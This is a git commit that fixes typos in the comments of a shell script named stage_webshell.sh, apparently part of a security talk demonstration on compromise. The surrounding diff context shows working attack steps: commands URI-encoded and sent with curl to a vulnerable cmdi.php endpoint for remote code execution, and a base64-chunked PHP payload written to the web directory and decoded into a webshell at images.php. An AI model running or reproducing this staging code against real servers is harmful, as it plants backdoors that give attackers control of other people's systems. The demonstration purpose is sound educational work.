02c9a6b2bacbe2c5fdc9026daac9c108c38b76ef
David Busby <oneiroi@fedoraproject.org>
2018-10-08 12:56:05 +0100

    minor comments typo corrections

--- Security_and_why_you_need_to_review_yours/compromise/stage_webshell.sh
+++ Security_and_why_you_need_to_review_yours/compromise/stage_webshell.sh
@@ -22,7 +22,7 @@ i=0
 cmd="echo '' > $webdir/images.b64"
 #At each step we need to URI encode the string
 cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
-#now using curl we execute the command agains the known vulnerable script (RCE - Remote Code Execution)
+#now using curl we execute the command against the known vulnerable script (RCE - Remote Code Execution)
 curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
 #Now we're going to use the base64 binary to split the payload into smaller parts
 base64 -w 100 images.php | while read chunk
@@ -38,6 +38,6 @@ echo "Phase3 - unpacking payload"
 cmd="base64 -d $webdir/images.b64 > $webdir/images.php"
 cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
 curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
-#And we're done, disaplay the link at which the payload script will run and exit
+#And we're done, display the link at which the payload script will run and exit
 echo "Payload staged webshell should be available here $vuln_webapp/images.php"
 echo "Happy hacking!"
